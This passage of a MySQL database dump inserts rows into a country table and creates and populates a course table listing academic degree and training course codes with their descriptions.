INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('57', 'Egypt', 'EGY');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('58', 'El Salvador', 'SLV');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('59', 'Ethiopia', 'ETH');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('60', 'Fiji', 'FJI');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('61', 'Finland', 'FIN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('62', 'France', 'FRA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('63', 'French Polynesia', 'PYF');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('64', 'Gabon', 'GAB');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('65', 'Georgia', 'GEO');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('66', 'Germany', 'DEU');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('67', 'Ghana', 'GHA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('68', 'Greece', 'GRC');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('69', 'Greenland', 'GRL');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('70', 'Grenada', 'GRD');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('71', 'Guam', 'GUM');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('72', 'Guatemala', 'GTM');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('73', 'Guinea', 'GIN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('74', 'Guinea-Bissau', 'GNB');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('75', 'Haiti', 'HTI');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('76', 'Honduras', 'HND');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('77', 'Hong Kong', 'HKG');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('78', 'Hungary', 'HUN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('79', 'Iceland', 'ISL');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('80', 'India', 'IND');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('81', 'Indonesia', 'IDN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('82', 'Iran', 'IRN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('83', 'Iraq', 'IRQ');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('84', 'Ireland', 'IRL');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('85', 'Isle of Man', 'IMN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('86', 'Israel', 'ISR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('87', 'Italy', 'ITA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('88', 'Ivory Coast', 'CIV');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('89', 'Jamaica', 'JAM');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('90', 'Japan', 'JPN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('92', 'Jersey', 'JEY');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('93', 'Jordan', 'JOR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('94', 'Kazakhstan', 'KAZ');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('95', 'Kenya', 'KEN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('96', 'Kuwait', 'KWT');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('97', 'Laos', 'LAO');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('98', 'Latvia', 'LVA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('99', 'Lebanon', 'LBN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('100', 'Liberia', 'LBR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('101', 'Libya', 'LBY');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('102', 'Macau', 'MAC');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('103', 'Macedonia', 'MKD');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('104', 'Madagascar', 'MDG');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('105', 'Malaysia', 'MYS');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('106', 'Maldives', 'MDV');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('107', 'Mali', 'MLI');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('108', 'Malta', 'MLT');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('109', 'Marshall Islands', 'MHL');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('110', 'Mayotte', 'MYT');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('111', 'Mexico', 'MEX');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('112', 'Monaco', 'MCO');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('113', 'Mongolia', 'MNG');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('114', 'Montenegro', 'MNE');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('115', 'Morocco', 'MAR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('116', 'Myanmar', 'MMR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('117', 'Nepal', 'NPL');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('118', 'Netherlands', 'NLD');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('119', 'Netherlands Antilles', 'ANT');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('120', 'New Caledonia', 'NCL');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('121', 'New Zealand', 'NZL');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('122', 'Nicaragua', 'NIC');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('123', 'Niger', 'NER');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('124', 'Nigeria', 'NGA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('125', 'North Korea', 'PRK');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('126', 'Norway', 'NOR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('127', 'Oman', 'OMN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('128', 'Pakistan', 'PAK');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('129', 'Palau', 'PLW');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('130', 'Palestine', 'PSE');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('131', 'Panama', 'PAN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('132', 'Papua New Guinea', 'PNG');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('133', 'Paraguay', 'PRY');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('134', 'Peru', 'PER');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('135', 'Philippines', 'PHL');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('136', 'Poland', 'POL');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('137', 'Portugal', 'PRT');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('138', 'Puerto Rico', 'PRI');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('139', 'Qatar', 'QAT');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('140', 'Republic of the Congo', 'COG');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('141', 'Reunion', 'REU');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('142', 'Romania', 'ROU');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('143', 'Russia', 'RUS');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('144', 'Saint Helena', 'SHN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('145', 'Saint Lucia', 'LCA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('146', 'Saint Martin', 'MAF');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('147', 'Saint Pierre and Miquelon', 'SPM');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('148', 'Saint Vincent and the Grenadines', 'VCT');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('149', 'Samoa', 'WSM');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('150', 'San Marino', 'SMR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('151', 'Saudi Arabia', 'SAU');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('152', 'Senegal', 'SEN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('153', 'Serbia', 'SRB');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('154', 'Singapore', 'SGP');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('155', 'Slovakia', 'SVK');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('156', 'Slovenia', 'SVN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('157', 'Solomon Islands', 'SLB');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('158', 'Somalia', 'SOM');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('159', 'South Africa', 'ZAF');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('160', 'South Korea', 'KOR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('161', 'South Sudan', 'SSD');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('162', 'Spain', 'ESP');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('163', 'Sri Lanka', 'LKA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('164', 'Sudan', 'SDN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('165', 'Sweden', 'SWE');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('166', 'Switzerland', 'CHE');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('167', 'Syria', 'SYR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('168', 'Taiwan', 'TWN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('169', 'Tajikistan', 'TJK');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('170', 'Tanzania', 'TZA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('171', 'Thailand', 'THA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('172', 'Togo', 'TGO');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('173', 'Tonga', 'TON');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('174', 'Tunisia', 'TUN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('175', 'Turkey', 'TUR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('176', 'U.S. Virgin Islands', 'VIR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('177', 'Uganda', 'UGA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('178', 'Ukraine', 'UKR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('179', 'United Arab Emirates', 'ARE');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('180', 'United Kingdom', 'GBR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('181', 'United States', 'USA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('182', 'Uruguay', 'URY');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('183', 'Uzbekistan', 'UZB');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('184', 'Vatican', 'VAT');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('185', 'Venezuela', 'VEN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('186', 'Vietnam', 'VNM');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('187', 'Yemen', 'YEM');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('188', 'Zambia', 'ZMB');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('189', 'Zimbabwe', 'ZWE');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('190', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('191', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('192', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('193', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('194', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('195', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('196', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('197', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('198', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('199', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('200', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('201', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('202', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('203', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('204', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('205', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('206', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('207', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('208', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('209', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('210', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('211', '', '');


#
# TABLE STRUCTURE FOR: tblcourse
#

DROP TABLE IF EXISTS `tblcourse`;

CREATE TABLE `tblcourse` (
  `courseCode` varchar(10) NOT NULL DEFAULT '',
  `courseDesc` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`courseCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS ChE', 'BS Chemical Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MS ChE', 'Master of Science in Chemical Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PhD ChE', 'Doctor of Philosophy in Chemical Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MIM', 'Master in Information Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BLAW', 'Bachelor of Laws');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MLAW', 'Master of Laws');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BBUSAD', 'BS Business Administration');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PRIM', 'Elementary');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('SEC', 'Secretarial');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS BIOCHEM', 'BS Bio-chemistry');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSH', 'Master of Science in Horticulture');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PhD BM', 'Doctor of Business Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('AB Eco.', 'Liberal of Arts Major in Economics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MA Eco.', 'Master of Arts in Ecomics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MNSA', 'Master of National Security Administration');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MBM', 'Master in  Business Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS Geo', 'BS Geology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MS Geo', 'Master of Science in Geology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PhD Geo', ' Doctor of Geometry');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PhDG', 'Doctor of Science in Geology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS IT', 'BS Information Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS ComSci', 'BS Computer Science');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BBM', 'Bachelor of Business Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MPA', 'Master in Public Administration');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MBA', 'Master in  Business Administration');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ComP', 'Computer Programming');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS Bio', 'BS Biology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MS Bio', 'Master of Science in Biology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSS', 'BS Statistics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSC', 'BS Commerce');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS Eco', 'BS Economics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS CE', 'BS Civil Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS DC', 'BS Development Communication');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('Comm', 'Commerce');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BBA', 'Bachelor of Business Administration major in Acctg');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BOA', 'Bachelor in Office Administration');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSC Acc', 'BSC Accounting');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS CBM', 'BS Commerce - Business Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSCoE', 'BS Computer Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MCS', 'Master in Computer Science');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PhD Tech', 'Doctor of Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSFN', 'BS Food and Nutrition');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MBE', 'Master in Business Education');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSEED', 'BS Elementary Education');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('', '');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('Pub Admin', 'Public Administration');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS Agr', 'BS Agriculture');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('Edu', 'Education');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MPS', 'M.A. Political Science');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ABE', 'AB Economics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSie', 'BS Industrial Education');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('CSPE', 'Civil Service Prof. Exam');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSM', 'Master of Science in Marketing');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ME', 'Masters in Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MCE', 'Major in Chemical Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('IS', 'International Studies');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('LA', 'Liberal Arts');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BTTEMFSM', 'Bachelor of Technical Teacher Educ. Major in FSM');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MMPA', 'Master in management(Public Administration)');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BBAMA', 'BS Business Administration Major in Accounting');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('CST', 'Computer Science Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('GradCertBI', 'Graduate Cert. Course in Business Intelligence');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('GradCertKM', 'Graduate Cert. Course in Knowledge Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('DipSIM', 'Diploma Course in Strategic Information Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MEC', 'Master of Engineering Major in Chem. Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MProfS', 'Master of Professional Studies');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MIS', 'Master in Information Systems');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('CETech', 'Computer Engineering Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BEng', 'Bachelor of Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSEnviSci', 'BS Environmental Science');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MC', 'Masters in Community');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ABComArts', 'AB Communication Arts Major in Advertising & PR');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MA GovM', 'Master in Government Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSNutD', 'BS Nutrition and Dietetics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSSci', 'MS Computer Science');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSCAd', 'BSC Advertising');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MPS Food', 'MPS in Food and Nutrition Planning');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSBA AC', 'BS Business Administration - Accounting');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS ME', 'BS Mechanical Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('Math', 'BS Math');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('AB Hum', 'AB Humanities w/ Prof. Cert. in Pol. Econ.');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PG DipMan', 'Post Graduate Diploma in Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BAc', 'BS Accountancy');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MABA', 'Master of Arts in Business Administration');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PhD Co', 'PhD Commerce');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('IndusElec', 'Industrial Electricity');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MPM', 'Master in Public Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSBio', 'MS Biology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MTechMan', 'Masters in Technology Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ComCourse', 'Computer Courses from Basic to Programming');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS AeEng', 'BS Aerospace Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PSTUD', 'AB Phil Studies');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('STENO', 'STENO-TYPING COURSE');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSC-M', 'BS Commerce Major in Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('GRCC', 'Government Radio Communications Certificate');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MGA-PA', 'Master in Govt Admin Major in Public Admin');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('DPA', 'Doctor of Public Administration');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSElec', 'BS Electrical Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSElec', 'Master of Science in Electrical Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MPM-TED', 'Masters in Public Management Tech. Enterprise Devt');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PhDTM', 'PH.D. in Technology Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('DPM', 'Doctor of Public Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('Vocational', 'Basic Scriptwriting Course');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ACS', 'Associate in Computer Science');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('4thYRBSCS', '4th Year BS Computer Science');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BBM-MBA', 'BBM-MBA');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('SAD', 'Systems Analysis and Design');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BProg', 'Basic Programming');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('COBOL', 'COBOL Programming');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('FlowPro', 'Flowcharting Proficiency');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('EDP', 'Basic EDP Concepts');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MCD', 'Masters in Community Development');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('2nd', 'Secondary');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BArt', 'Bachelor of Arts');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSCBF', 'BSC Major in Banking and Finance');
